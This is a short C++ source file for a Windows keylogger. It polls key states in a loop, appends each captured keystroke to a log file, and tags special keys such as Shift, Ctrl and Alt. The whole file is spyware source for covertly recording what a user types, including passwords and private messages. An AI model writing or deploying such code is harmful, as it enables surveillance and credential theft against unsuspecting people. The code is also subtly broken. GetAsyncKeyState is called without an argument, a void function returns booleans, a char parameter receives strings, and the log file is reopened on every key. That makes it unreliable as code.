#include <keylogger.h>

void Keylogger::Logger() {
    while(execute) {
        Sleep(10);

        for(char key = 8; key <= 190; ++key) {
            if(GetAsyncKeyState() == -32767 && !actionKey(key)) {
                file.open(fileName, fstream::app);
                file << key;
            }
        }
    }

    file.close();
}

void Keylogger::writeToLog(const char key) {
      file.open(fileName, fstream::app);
      file << key;
}

void actionKey(const char key) {
    switch(key) {
        case VK_SPACE:
            writeToLog(" ");
            break;

        case VK_RETURN:
            writeToLog("\n");
            break;

        case VK_TAB:
            writeToLog("\t");
            break;

        case VK_DELETE:
            writeToLog("[DEL]");
            break;

        case VK_BACK:
            writeToLog("[BACK]");
            break;

        case VK_SHIFT:
            writeToLog("[SHIFT]");
            break;

        case VK_CONTROL:
            writeToLog("[CTRL]");
            break;

        case VK_MENU:
            writeToLog("[ALT]");
            break;

        default:
            return false;
            break;
    }

    return true;
}
